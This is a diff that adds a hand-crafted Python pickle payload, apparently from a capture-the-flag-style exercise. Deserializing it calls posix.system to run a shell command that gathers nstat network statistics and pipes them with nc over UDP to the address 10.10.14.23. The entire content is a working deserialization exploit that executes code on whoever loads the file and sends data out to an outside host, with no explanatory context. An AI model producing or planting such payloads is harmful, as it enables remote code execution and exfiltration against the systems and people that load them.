@@ -1,0 +1,6 @@
+cposix
+system
+p1
+(S"echo 'homer'; echo -e $(nstat)\\\n | nc -u 10.10.14.23 6667"
+tRp2
+.
